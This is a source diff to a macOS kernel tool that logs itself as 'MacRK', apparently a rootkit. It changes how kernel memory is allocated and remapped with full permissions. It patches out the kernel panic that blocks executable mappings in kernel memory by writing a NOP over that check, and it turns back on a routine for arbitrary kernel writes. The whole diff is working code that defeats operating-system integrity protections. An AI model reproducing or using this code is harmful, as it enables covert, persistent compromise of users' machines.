@@ -12,6 +12,9 @@ extern "C"
 	#include "kern.h"
 }
 
+off_t Kernel::tempExecutableMemoryOffset = 0;
+
+uint8_t Kernel::tempExecutableMemory[tempExecutableMemorySize] __attribute__((section("__TEXT,__text")));
 
 Kernel::Kernel(mach_port_t kernel_task_port)
 {
@@ -720,9 +723,11 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 #ifdef __x86_64__
 
+	address = 0x1000;
+
 	map = this->read64(this->getSymbolAddressByName("_g_kext_map"));
 
-	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, VM_KERN_MEMORY_KEXT, 0, 0, FALSE, (uint64_t) prot, (uint64_t) VM_INHERIT_DEFAULT };
+	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, 0, VM_KERN_MEMORY_KEXT, 0, 0, FALSE, (uint64_t) prot, (uint64_t) prot, (uint64_t) VM_INHERIT_DEFAULT };
 
 	ret = static_cast<kern_return_t>(this->call("_vm_map_enter", vmEnterArgs, 13));
 
@@ -732,9 +737,10 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 	using namespace Arch::arm64;
 
-	mach_vm_address_t vm_allocate_external = this->getSymbolAddressByName("_vm_allocate_external");
-
 	char buffer[128];
+
+	/*
+	mach_vm_address_t vm_allocate_external = this->getSymbolAddressByName("_vm_allocate_external");
 
 	mach_vm_address_t branch = Arch::arm64::PatchFinder::step64(this->macho, vm_allocate_external, 0x10, reinterpret_cast<bool(*)(uint32_t*)>(Arch::arm64::is_b), -1, -1);
 
@@ -782,9 +788,27 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 	map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
 
-	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, 0, 6, 0, 0, FALSE, (uint64_t) prot, (uint64_t) prot, (uint64_t) VM_INHERIT_DEFAULT };
+	address = *(uint64_t*) (map + 32);
+
+	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, 0, 1, 0, 0, FALSE, (uint64_t) prot, (uint64_t) VM_PROT_ALL, (uint64_t) VM_INHERIT_DEFAULT };
 	
 	ret = static_cast<kern_return_t>(this->call(vm_map_enter, vmEnterArgs, 13));
+	*/
+
+	map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
+
+	uint64_t vmAllocateExternalArgs[4] = { map, (uint64_t) &address, size, VM_FLAGS_ANYWHERE };
+
+	ret = static_cast<kern_return_t>(this->call("_vm_allocate_external", vmAllocateExternalArgs, 4));
+
+	/*
+	mach_vm_address_t vm_map_enter_mem_object_helper_strref = Arch::arm64::PatchFinder::findStringReference(macho, "VM_FLAGS_RETURN_DATA_ADDR not expected for submap. @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
+
+	mach_vm_address_t vm_map_enter_mem_object_helper = Arch::arm64::PatchFinder::findFunctionBegin(macho, vm_map_enter_mem_object_helper_strref - 0x2FFF, vm_map_enter_mem_object_helper_strref);
+
+	uint64_t vmMapEnterMemObjectHelperArgs[15] = { map, (uint64_t) &address, size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, 0, 0, 0, 0, FALSE, VM_PROT_ALL, VM_PROT_ALL, VM_INHERIT_DEFAULT, 0, 0 };
+
+	ret = static_cast<kern_return_t>(this->call(vm_map_enter_mem_object_helper, vmMapEnterMemObjectHelperArgs, 15)); */
 
 #endif
 
@@ -819,21 +843,125 @@ bool Kernel::vmProtect(mach_vm_address_t address, size_t size, vm_prot_t prot)
 
 	mach_vm_address_t ml_static_protect;
 
-	mach_vm_address_t ml_static_protect_strref = Arch::arm64::PatchFinder::findStringReference(macho, "pmap_enter_options(): attempt to add executable mapping to kernel_pmap @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
+	mach_vm_address_t ml_static_protect_strref = Arch::arm64::PatchFinder::findStringReference(macho, "ml_static_protect(): attempt to inject executable mapping on %p @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
 
-	ml_static_protect = Arch::arm64::PatchFinder::findFunctionBegin(macho, ml_static_protect - 0x1FF, ml_static_protect_strref);
+	static bool patched = false;
+
+	if(!patched)
+	{
+		uint32_t nop = 0xd503201f;
+
+		mach_vm_address_t panic = Arch::arm64::PatchFinder::stepBack64(macho, ml_static_protect_strref, 0x20, reinterpret_cast<bool(*)(uint32_t*)>(Arch::arm64::is_movz), -1, -1);
+
+		mach_vm_address_t panic_xref = Arch::arm64::PatchFinder::xref64(macho, panic - 0xFFF, panic, panic);
+
+		char buffer[128];
+
+		snprintf(buffer, 128, "0x%llx", panic_xref);
+
+		MAC_RK_LOG("MacRK::panic_xref = %s\n", buffer);
+
+		if(panic_xref)
+		{
+			*(uint32_t*) panic_xref = nop;
+
+			patched = true;
+		}
+	}
+
+	ml_static_protect = Arch::arm64::PatchFinder::findFunctionBegin(macho, ml_static_protect_strref - 0x2FF, ml_static_protect_strref);
 
 	uint64_t mlStaticProtectArgs[3] = { address, size, (uint64_t) prot };
 
+	ml_set_interrupts_enabled(false);
+
 	ret = static_cast<kern_return_t>(this->call(ml_static_protect, mlStaticProtectArgs, 3));
+
+	ml_set_interrupts_enabled(true);
+
+	if(ret != KERN_SUCCESS)
+	{
+		MAC_RK_LOG("MacRK::ml_static_protect failed! error = %d\n", ret);
+
+		return false;
+	}
 
 #endif
 
-	return ret == KERN_SUCCESS ||  kernel_vm_protect(address, size, prot);
+	MAC_RK_LOG("MacRK::ml_static_protect success!\n");
+
+	return ret == KERN_SUCCESS;
 }
 
 void* Kernel::vmRemap(mach_vm_address_t address, size_t size)
 {
+
+#ifdef __arm64__
+
+#include <arm64/Isa_arm64.hpp>
+
+	using namespace Arch::arm64;
+
+	kern_return_t ret;
+
+	char buffer[128];
+
+	mach_vm_address_t map;
+
+	mach_vm_address_t addr = 0;
+
+	vm_prot_t cur_protection = VM_PROT_ALL;
+	vm_prot_t max_protection = VM_PROT_ALL;
+
+	mach_vm_address_t vm_map_remap;
+
+	mach_vm_address_t vm_map_protect_strref = Arch::arm64::PatchFinder::findStringReference(this->macho, "vm_map_protect(%p,0x%llx,0x%llx) new=0x%x wired=%x @%s:%d", 1, __cstring_, __TEXT_XNU_BASE, false);
+
+	mach_vm_address_t cbz = Arch::arm64::PatchFinder::stepBack64(macho, vm_map_protect_strref, 0xFFF, reinterpret_cast<bool(*)(uint32_t*)>(is_cbz), -1, -1);
+
+	cbz = Arch::arm64::PatchFinder::stepBack64(macho, cbz - sizeof(uint32_t), 0xFFF, reinterpret_cast<bool(*)(uint32_t*)>(is_cbz), -1, -1);
+
+	mach_vm_address_t branch = Arch::arm64::PatchFinder::stepBack64(macho, cbz, 0x10, reinterpret_cast<bool(*)(uint32_t*)>(is_bl), -1, -1);
+
+	bool sign;
+
+	bl_t bl = *(bl_t*) branch;
+
+	uint64_t imm = bl.imm;
+
+	if(imm & 0x2000000)
+	{
+		imm = ~(imm - 1);
+		imm &= 0x1FFFFFF;
+
+		sign = true;
+	} else
+	{
+		sign = false;
+	}
+
+	imm *= (1 << 2);
+
+	vm_map_remap = sign ? branch - imm : branch + imm;
+
+	map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
+
+	uint64_t vmMapRemapArgs[13] = { map, (uint64_t) &addr, size, 0, VM_FLAGS_ANYWHERE, 0, 0, map, address, false, (uint64_t) &cur_protection, (uint64_t) &max_protection, (uint64_t) VM_INHERIT_DEFAULT };
+
+	ret = static_cast<kern_return_t>(this->call(vm_map_remap, vmMapRemapArgs, 13));
+
+	if(ret != KERN_SUCCESS)
+	{
+		MAC_RK_LOG("MacRK::vm_map_remap failed!\n");
+
+		return 0;
+	}
+
+	return reinterpret_cast<void*>(addr);
+	
+#endif
+
+
 	return kernel_vm_remap(address, size);
 }
 
@@ -1024,11 +1152,11 @@ bool Kernel::write(mach_vm_address_t address, void *data, size_t size)
 
 	src_ppnum = this->call("_pmap_find_phys", src_pmapFindPhysArgs, 2);
 
-	src_pa = ((src_ppnum << 14) | ((mach_vm_address_t) data & 0x3FFF));
+	src_pa = ((src_ppnum << 14) | (src_ppnum ? (mach_vm_address_t) data & 0x3FFF : 0));
 
 	dest_ppnum = this->call("_pmap_find_phys", dest_pmapFindPhysArgs, 2);
 
-	dest_pa = ((dest_ppnum << 14) | ((mach_vm_address_t) address & 0x3FFF));
+	dest_pa = ((dest_ppnum << 14) | (dest_ppnum ? (mach_vm_address_t) address & 0x3FFF : 0));
 
 	if(src_pa && dest_pa)
 	{
@@ -1102,8 +1230,6 @@ bool Kernel::write(mach_vm_address_t address, void *data, size_t size)
 
 	vm_map_copy_t copy;
 
-	/*
-
 	const uint8_t *write_data = (uint8_t*) data;
 
 	while(size > 0)
@@ -1127,8 +1253,6 @@ bool Kernel::write(mach_vm_address_t address, void *data, size_t size)
 		write_data += write_size;
 		size -= write_size;
 	}
-
-	*/
 
 	return true;
 #elif
